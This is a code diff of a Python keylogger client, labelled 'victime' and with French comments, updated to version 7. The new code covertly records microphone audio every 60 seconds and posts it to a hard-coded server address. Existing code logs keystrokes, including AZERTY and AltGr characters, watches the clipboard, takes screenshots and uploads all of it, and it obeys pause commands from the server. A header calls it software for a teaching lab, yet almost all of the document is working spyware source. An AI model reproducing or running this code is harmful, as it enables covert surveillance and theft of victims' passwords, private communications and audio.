@@ -1,6 +1,6 @@
 """
-LG WS KEYLOGGER - CLIENT (VICTIME)
-----------------------------------------------------
+LG WS KEYLOGGER - CLIENT (VICTIME) - V7 (AUDIO ENABLED)
+-------------------------------------------------------
 ATTENTION : Ce logiciel est conçu uniquement à des fins pédagogiques 
 dans le cadre d'un laboratoire d'étude en cybersécurité.
 """
@@ -13,15 +13,20 @@ import uuid
 import base64
 import requests
 import pyperclip
+import sounddevice as sd
+import numpy as np
+from scipy.io.wavfile import write
 from pynput import keyboard
 from PIL import ImageGrab
 from datetime import datetime
 from io import BytesIO
 
 # --- CONFIGURATION ---
-SERVER_URL = "http://[IP_MACHINE_ATTAQUANTE]:5000/api/data"
+SERVER_URL = "http://172.16.20.202:5000/api/data"
 SEND_INTERVAL = 3
 SCREENSHOT_INTERVAL = 30 
+AUDIO_INTERVAL = 60    # Enregistre le son toutes les 60 secondes
+AUDIO_DURATION = 5     # Durée de l'enregistrement (secondes)
 
 class LG_WS_Keylogger:
     def __init__(self):
@@ -33,9 +38,9 @@ class LG_WS_Keylogger:
         self.last_clipboard = ""
         self.system_info = self.get_system_info()
         
-        # --- NOUVEAU : Gestion des états clavier ---
-        self.caps_lock_on = False  # État du Verrou Maj
-        self.alt_gr_pressed = False # État de la touche AltGr
+        # Gestion Clavier
+        self.caps_lock_on = False 
+        self.alt_gr_pressed = False 
 
     def get_ip_address(self):
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -54,64 +59,72 @@ class LG_WS_Keylogger:
             "hostname": socket.gethostname(),
             "ip_address": self.get_ip_address(),
             "uuid": self.uuid,
-            "agent_version": "LG WS v1.2 (Azerty Fix)"
+            "agent_version": "LG WS v1.3 (Audio Capable)"
         }
 
-    def process_key_azerty(self, key):
-        """Logique personnalisée pour gérer AZERTY et CAPS LOCK"""
+    # --- PARTIE AUDIO ---
+    def record_and_send_audio(self):
+        """Enregistre l'audio dans un thread pour ne pas bloquer le keylogger"""
+        if self.is_paused: return
+        
         try:
-            # 1. Gestion des caractères spéciaux (Espace, Entrée...)
+            fs = 44100  # Fréquence
+            # Enregistrement (bloquant pour ce thread, mais pas pour le programme principal)
+            recording = sd.rec(int(AUDIO_DURATION * fs), samplerate=fs, channels=1) # Mono pour être léger
+            sd.wait()
+            
+            # Sauvegarde en mémoire (pas de fichier disque)
+            virtual_file = BytesIO()
+            write(virtual_file, fs, recording)
+            
+            # Encodage Base64
+            encoded_audio = base64.b64encode(virtual_file.getvalue()).decode()
+            
+            # Envoi immédiat
+            packet = {
+                "uuid": self.uuid,
+                "type": "audio",
+                "audio_data": encoded_audio
+            }
+            requests.post(SERVER_URL, json=packet, timeout=10)
+            
+        except Exception:
+            pass # Si pas de micro ou erreur, on continue silencieusement
+
+    # --- PARTIE CLAVIER (AZERTY FIX) ---
+    def process_key_azerty(self, key):
+        try:
             if key == keyboard.Key.space: return " "
             if key == keyboard.Key.enter: return "\n"
             if key == keyboard.Key.backspace: return "[DEL]"
             if key == keyboard.Key.tab: return "\t"
             
-            # Si c'est un caractère imprimable
             if hasattr(key, 'char') and key.char is not None:
                 char = key.char
-
-                # 2. CORRECTION @ (AltGr + à)
-                # Sur AZERTY, la touche 'à' (0) avec AltGr doit donner '@'
                 if self.alt_gr_pressed:
-                    if char == 'à' or char == '0': 
-                        return "@"
+                    if char == 'à' or char == '0': return "@"
                     if char == 'e': return "€"
-                    # On peut ajouter d'autres mappings ici si besoin ({ [ | etc)
-
-                # 3. CORRECTION CAPS LOCK
-                # Si c'est une lettre minuscule et que CapsLock est ON -> Majuscule
                 if self.caps_lock_on and char.isalpha():
                     return char.upper()
-                
-                # Si CapsLock est OFF mais Shift est maintenu, pynput le gère généralement seul
-                # mais au cas où, on laisse le char tel quel (pynput renvoie souvent déjà la majuscule avec Shift)
                 return char
-
             return ""
-        except:
-            return ""
+        except: return ""
 
     def on_press(self, key):
         if self.is_paused: return
-
-        # Détection des modificateurs
         if key == keyboard.Key.caps_lock:
-            self.caps_lock_on = not self.caps_lock_on # Bascule ON/OFF
-            # On ne log pas la touche caps lock elle-même
+            self.caps_lock_on = not self.caps_lock_on
             return
-
         if key == keyboard.Key.alt_gr:
             self.alt_gr_pressed = True
             return
 
-        # Traitement du caractère
         clean_char = self.process_key_azerty(key)
         if clean_char:
             with self.lock:
                 self.log_buffer += clean_char
 
     def on_release(self, key):
-        # Important : Détecter quand on relâche AltGr
         if key == keyboard.Key.alt_gr:
             self.alt_gr_pressed = False
 
@@ -119,12 +132,12 @@ class LG_WS_Keylogger:
         while self.is_running:
             if not self.is_paused:
                 try:
-                    current_content = pyperclip.paste()
-                    if current_content and current_content != self.last_clipboard:
-                        self.last_clipboard = current_content
+                    current = pyperclip.paste()
+                    if current and current != self.last_clipboard:
+                        self.last_clipboard = current
                         ts = datetime.now().strftime("%H:%M:%S")
                         with self.lock:
-                            self.log_buffer += f"\n--- [CLIPBOARD {ts}] ---\n{current_content}\n-----------------------------\n"
+                            self.log_buffer += f"\n--- [CLIPBOARD {ts}] ---\n{current}\n-----------------------------\n"
                 except: pass
             time.sleep(1)
 
@@ -143,14 +156,12 @@ class LG_WS_Keylogger:
             "type": "heartbeat", "system_info": self.system_info,
             "keystrokes": "", "screenshot": None
         }
-
         if not self.is_paused:
             with self.lock:
                 if self.log_buffer:
                     data["keystrokes"] = self.log_buffer
                     data["type"] = "log_update"
                     self.log_buffer = ""
-
         try:
             res = requests.post(SERVER_URL, json=data, timeout=3)
             if res.status_code == 200:
@@ -163,20 +174,32 @@ class LG_WS_Keylogger:
         elif cmd == "continue" and self.is_paused: self.is_paused = False
 
     def main_loop(self):
-        print(f"[*] LG WS KEYLOGGER (Azerty) - UUID: {self.uuid}")
+        print(f"[*] LG WS KEYLOGGER V7 (Audio) - UUID: {self.uuid}")
+        
         last_screen = 0
+        last_audio = 0
+        
         while self.is_running:
-            if not self.is_paused and (time.time() - last_screen > SCREENSHOT_INTERVAL):
+            now = time.time()
+            
+            # Gestion Screenshot
+            if not self.is_paused and (now - last_screen > SCREENSHOT_INTERVAL):
                 scr = self.capture_screenshot()
                 if scr:
                     try: requests.post(SERVER_URL, json={"uuid": self.uuid, "type": "screen", "screenshot": scr})
                     except: pass
-                last_screen = time.time()
+                last_screen = now
+
+            # Gestion Audio (Nouveau Thread)
+            if not self.is_paused and (now - last_audio > AUDIO_INTERVAL):
+                # On lance l'enregistrement dans un thread pour ne pas bloquer la boucle
+                threading.Thread(target=self.record_and_send_audio).start()
+                last_audio = now
+
             self.send_heartbeat()
             time.sleep(SEND_INTERVAL)
 
     def start(self):
-        # Ajout de on_release pour gérer le relâchement de AltGr
         listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
         listener.start()
         threading.Thread(target=self.monitor_clipboard, daemon=True).start()
